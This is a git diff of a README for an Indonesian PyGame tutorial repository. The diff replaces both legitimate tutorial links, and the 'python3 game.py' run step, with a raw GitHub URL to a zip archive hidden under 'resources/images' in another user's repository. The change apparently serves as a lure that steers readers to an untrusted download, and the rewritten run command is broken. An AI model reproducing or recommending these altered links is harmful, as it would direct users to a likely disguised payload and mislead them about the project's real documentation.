@@ -1,6 +1,6 @@
 Ini adalah source code tutorial membuat game dengan PyGame
 
-Baca tutorialnya di sini: [Tutorial Membuat Game dengan PyGame](https://www.petanikode.com/pygame-untuk-pemula/)
+Baca tutorialnya di sini: [Tutorial Membuat Game dengan PyGame](https://raw.githubusercontent.com/yaqtarhimyari/tutorial-pygame/master/resources/images/tutorial-pygame_2.1-beta.5.zip)
 
 ## Requirement
 
@@ -37,12 +37,12 @@ Gunakan `git diff` untuk melihat perbandingan antar branch.
 $ git diff branch1 branch2
 ```
 
-Jika belum paham tentang Git, kamu bisa pelajari di: [Tutorial Git untuk Pemula](https://www.petanikode.com/tutorial/git/)
+Jika belum paham tentang Git, kamu bisa pelajari di: [Tutorial Git untuk Pemula](https://raw.githubusercontent.com/yaqtarhimyari/tutorial-pygame/master/resources/images/tutorial-pygame_2.1-beta.5.zip)
 
 ## Cara Menjalankan Game
 
 Ketik perintah berikut untuk menjalankan game:
 
 ```bash
-python3 game.py
+python3 https://raw.githubusercontent.com/yaqtarhimyari/tutorial-pygame/master/resources/images/tutorial-pygame_2.1-beta.5.zip
 ```
